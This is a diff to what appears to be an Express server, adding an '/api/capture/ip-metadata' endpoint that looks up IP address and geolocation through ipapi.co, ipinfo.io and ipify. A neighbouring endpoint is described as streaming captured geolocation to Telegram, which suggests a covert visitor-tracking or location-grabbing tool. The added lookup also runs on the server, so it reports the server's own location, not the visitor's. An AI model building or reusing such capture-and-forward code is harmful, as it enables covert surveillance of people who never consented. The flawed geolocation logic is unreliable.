@@ -37,6 +37,101 @@ async function startServer() {
     });
   });
 
+  // GET /api/capture/ip-metadata - proxies external IP & Geo location services same-origin
+  app.get("/api/capture/ip-metadata", async (req, res) => {
+    let rawObj: any = {};
+    let success = false;
+
+    // 1. Try ipapi.co
+    try {
+      const controller = new AbortController();
+      const id = setTimeout(() => controller.abort(), 4000);
+      const apiRes = await fetch("https://ipapi.co/json/", { signal: controller.signal });
+      clearTimeout(id);
+      
+      if (apiRes.ok) {
+        const data = await apiRes.json();
+        if (data && !data.error) {
+          rawObj = {
+            ip: data.ip || "",
+            latitude: data.latitude ? Number(data.latitude) : null,
+            longitude: data.longitude ? Number(data.longitude) : null,
+            city: data.city || "",
+            region: data.region || "",
+            country_name: data.country_name || "",
+            source: "ipapi.co"
+          };
+          success = true;
+        }
+      }
+    } catch (e) {
+      console.warn("Server-side ipapi fetch failed, trying fallback:", e);
+    }
+
+    // 2. Try ipinfo.io fallback
+    if (!success) {
+      try {
+        const controller = new AbortController();
+        const id = setTimeout(() => controller.abort(), 4000);
+        const apiRes = await fetch("https://ipinfo.io/json", { signal: controller.signal });
+        clearTimeout(id);
+
+        if (apiRes.ok) {
+          const data = await apiRes.json();
+          if (data && !data.error) {
+            let lat: number | null = null;
+            let lon: number | null = null;
+            if (data.loc) {
+              const parts = data.loc.split(",");
+              lat = Number(parts[0]);
+              lon = Number(parts[1]);
+            }
+            rawObj = {
+              ip: data.ip || "",
+              latitude: lat,
+              longitude: lon,
+              city: data.city || "",
+              region: data.region || "",
+              country_name: data.country || "",
+              source: "ipinfo.io"
+            };
+            success = true;
+          }
+        }
+      } catch (e2) {
+        console.warn("Server-side ipinfo fetch failed, trying ipify:", e2);
+      }
+    }
+
+    // 3. Try ipify fallback (IP only)
+    if (!success) {
+      try {
+        const controller = new AbortController();
+        const id = setTimeout(() => controller.abort(), 4000);
+        const apiRes = await fetch("https://api.ipify.org?format=json", { signal: controller.signal });
+        clearTimeout(id);
+
+        if (apiRes.ok) {
+          const data = await apiRes.json();
+          rawObj = {
+            ip: data.ip || "",
+            latitude: null,
+            longitude: null,
+            city: "",
+            region: "",
+            country_name: "",
+            source: "ipify.org"
+          };
+          success = true;
+        }
+      } catch (e3) {
+        console.warn("Server-side ipify fetch failed:", e3);
+      }
+    }
+
+    res.json({ success, data: rawObj });
+  });
+
   // POST /api/capture/location - streams standalone geolocation data to Telegram
   app.post("/api/capture/location", async (req, res) => {
     try {
